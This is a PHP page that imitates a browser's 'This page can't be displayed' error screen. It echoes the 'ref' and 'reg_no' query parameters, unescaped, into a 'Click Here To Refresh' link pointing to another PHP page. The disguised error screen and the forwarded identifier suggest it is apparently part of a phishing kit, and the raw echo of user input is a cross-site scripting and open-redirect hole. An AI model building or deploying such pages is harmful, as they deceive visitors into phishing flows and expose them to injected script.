<?php

	@$href = $_GET['ref'];
	$to = $_GET['reg_no'];

?>
<!DOCTYPE HTML>
<html>

    <head>
        

        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>This page can&rsquo;t be displayed</title>

        <script src="errorPageStrings.js" language="javascript" type="text/javascript">
        </script>
        <script src="httpErrorPagesScripts.js" language="javascript" type="text/javascript">
        </script>
    </head>

	
    &nbsp;&nbsp;<div><body bgcolor="white" >
        <br><br><br><br><table  height="0" border="0" cellpadding="0" ><div id="contentContainer" class="mainContent">
            <tr><td></td><td width="650" colspan = "2"><div id="mainTitle" class="title"><font  color="#2778ec" style = "font-family : segoe ui; font-weight: 300; font-size:38pt; position:relative;">This page can&rsquo;t be displayed</font></div></td></tr>
            <tr><td width="250"></td><td width="50"></td><td><div class="taskSection" id="taskSection">
                <ul id="cantDisplayTasks" class="tasks">
                    <li id="task1-1"><font size="5" color="#40484f">Make sure the web address <span id="webpage" class="webpageURL"></span>is correct.</li></font>
                    <li id="task1-2"><font size="5" color="#40484f">Look for the page with your search engine.</li></font>
                    <li id="task1-3"><font size="5" color="#40484f">Refresh the page in a few minutes.</li></font>
                </ul>
				
                
            </div>
			</td></tr>
            <tr ><td></td><td colspan = "2"><br><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href="
			<?php 
				$url = (isset($href)) ? $href : "#"; 
				echo $url.".php?reg_no=$to";
			?>"><button id="diagnose" class="diagnoseButton" style = "height:35px; font-family : segoe ui; width: 170px;" ><b>Click Here To Refresh</b></button></a></div>
			</td></tr>
			</table></div>
        </div>
    </body>
</html>